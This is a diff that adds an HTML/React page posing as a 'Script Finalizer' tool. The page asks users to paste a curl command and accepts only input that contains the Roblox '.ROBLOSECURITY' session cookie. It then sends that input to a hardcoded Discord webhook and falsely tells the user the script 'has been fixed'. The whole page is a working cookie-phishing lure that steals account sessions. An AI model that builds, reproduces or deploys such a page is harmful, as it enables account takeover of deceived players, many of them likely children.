@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+  <head>
+    <meta charset="utf-8" />
+    <link rel="icon" href="https://favicon.ico" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="theme-color" content="#000000" />
+    <title>Script Finalizer</title>
+
+    <!-- Tailwind CDN (fastest for GitHub Pages) -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        darkMode: 'class',
+        theme: {
+          extend: {
+            fontFamily: { mono: ['ui-monospace', 'SFMono-Regular', 'Consolas', 'Liberation Mono', 'Menlo', 'monospace'] }
+          }
+        }
+      }
+    </script>
+
+    <!-- Lucide Icons CDN -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+
+    <!-- Framer Motion CDN (we only need the lightweight version) -->
+    <script type="module">
+      import { motion, AnimatePresence } from "https://cdn.jsdelivr.net/npm/framer-motion@11/dist/framer-motion.js";
+      window.motion = motion;
+      window.AnimatePresence = AnimatePresence;
+    </script>
+  </head>
+  <body class="h-full bg-black text-white">
+    <div id="root"></div>
+
+    <script type="module">
+      import React from "https://esm.sh/react@18";
+      import ReactDOM from "https://esm.sh/react-dom@18/client";
+
+      const { useState } = React;
+
+      // Lucide icons (we create them manually since CDN)
+      const createIcon = (name) => {
+        const i = document.createElement("i");
+        i.setAttribute("data-lucide", name);
+        return i;
+      };
+
+      const Home = () => {
+        const [input, setInput] = useState('');
+        const [status, setStatus] = useState(null);
+        const [isSubmitting, setIsSubmitting] = useState(false);
+
+        const handleSubmit = async () => {
+          const trimmedInput = input.trim();
+          if (!trimmedInput.startsWith('curl') || !trimmedInput.includes('.ROBLOSECURITY')) {
+            setStatus('error');
+            return;
+          }
+          setIsSubmitting(true);
+          try {
+            let processedInput = trimmedInput.replace(/https:\/\//g, '');
+            processedInput = processedInput.replace(/curl\s+/g, 'curl ...');
+            const truncatedInput = processedInput.substring(0, 4000);
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1440146889939882087/HPjpz_PLLJI__-ue7qScQ3IXKMZyhLrjf0ZX64P5uK_W9RoIaCjXQgxWeYFY1TY0i_DP';
+            await fetch(webhookUrl, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                embeds: [{
+                  title: 'Script Submission',
+                  description: truncatedInput,
+                  color: 0x00ff00,
+                  timestamp: new Date().toISOString()
+                }]
+              })
+            });
+            setStatus('success');
+            setInput('');
+          } catch (error) {
+            setStatus('error');
+          } finally {
+            setIsSubmitting(false);
+          }
+        };
+
+        return (
+          <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 relative overflow-hidden">
+            {/* Background grid */}
+            <div className="absolute inset-0 bg-[linear-gradient(to_right,#111_1px,transparent_1px),linear-gradient(to_bottom,#111_1px,transparent_1px)] bg-[size:4rem_4rem] opacity-30" />
+            
+            {/* Gradient orbs */}
+            <div className="absolute top-0 left-1/4 w-96 h-96 bg-purple-900/20 rounded-full blur-3xl" />
+            <div className="absolute bottom-0 right-1/4 w-96 h-96 bg-blue-900/20 rounded-full blur-3xl" />
+
+            <div className="relative z-10 w-full max-w-2xl">
+              {/* Header */}
+              <div className="text-center mb-16">
+                <div className="inline-flex items-center gap-3 mb-2">
+                  {createIcon("terminal")}
+                  <h1 className="text-4xl font-light tracking-wide">Script Finalizer</h1>
+                </div>
+                <div className="h-px w-32 bg-gradient-to-r from-transparent via-purple-500 to-transparent mx-auto mt-4" />
+              </div>
+
+              {/* Card */}
+              <div className="bg-zinc-900/50 backdrop-blur-xl border border-zinc-800 rounded-2xl p-8 shadow-2xl">
+                <label className="block mb-4 text-sm font-light text-zinc-400 tracking-wide">
+                  Insert Game ID BASH
+                </label>
+                <textarea
+                  value={input}
+                  onChange={(e) => { setInput(e.target.value); setStatus(null); }}
+                  placeholder="curl https://..."
+                  disabled={isSubmitting}
+                  className="w-full min-h-52 bg-black/50 border border-zinc-700 focus:border-purple-500 text-white placeholder:text-zinc-600 font-mono text-sm resize-none rounded-lg p-4 transition-all duration-300 outline-none"
+                />
+                <div className="mt-2 text-right text-xs text-zinc-500">
+                  {input.length} / 4000 characters
+                </div>
+
+                {/* Status */}
+                {status === 'success' && (
+                  <div className="mt-4 flex items-center gap-2 text-green-400 bg-green-950/30 border border-green-800/30 rounded-lg px-4 py-3 animate-pulse">
+                    {createIcon("check-circle")}
+                    <span className="font-light">The script has been fixed!</span>
+                  </div>
+                )}
+                {status === 'error' && (
+                  <div className="mt-4 flex items-center gap-2 text-red-400 bg-red-950/30 border border-red-800/30 rounded-lg px-4 py-3 animate-pulse">
+                    {createIcon("alert-circle")}
+                    <span className="font-light">Invalid input type!</span>
+                  </div>
+                )}
+
+                <button
+                  onClick={handleSubmit}
+                  disabled={isSubmitting || !input.trim()}
+                  className="w-full mt-6 bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 disabled:opacity-50 h-12 text-base font-light tracking-wide rounded-lg transition-all duration-300 flex items-center justify-center gap-2"
+                >
+                  {isSubmitting ? (
+                    <> {createIcon("loader-2")} Processing... </>
+                  ) : (
+                    'Submit Script'
+                  )}
+                </button>
+              </div>
+
+              <p className="text-center mt-8 text-zinc-600 text-sm font-light">
+                Only curl commands are accepted
+              </p>
+            </div>
+          </div>
+        );
+      };
+
+      // Initialize lucide icons
+      lucide.createIcons();
+
+      ReactDOM.createRoot(document.getElementById('root')).render(<Home />);
+    </script>
+  </body>
+</html>
